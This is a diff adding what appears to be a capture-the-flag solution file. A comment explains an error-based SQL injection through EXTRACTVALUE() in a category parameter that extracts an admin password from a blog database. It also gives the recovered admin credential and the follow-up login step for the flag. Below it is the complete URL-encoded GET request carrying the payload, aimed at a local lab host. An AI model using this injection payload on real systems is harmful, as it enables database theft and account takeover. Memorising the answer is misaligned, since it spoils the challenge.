@@ -1,0 +1,4 @@
+# Error-based SQL injection via EXTRACTVALUE() in ?category= parameter. Dumps admin password from blogDB.admins. Follow up: POST /admin.php with admin:ONEverySecurePassword_! to get the flag.
+
+GET /?category=Nature%27+AND+EXTRACTVALUE%281663%2CCONCAT%280x5c%2C%28SELECT+password+FROM+blogDB.admins+LIMIT+1%29%29%29--+- HTTP/1.1
+Host: 172.17.0.1:42669
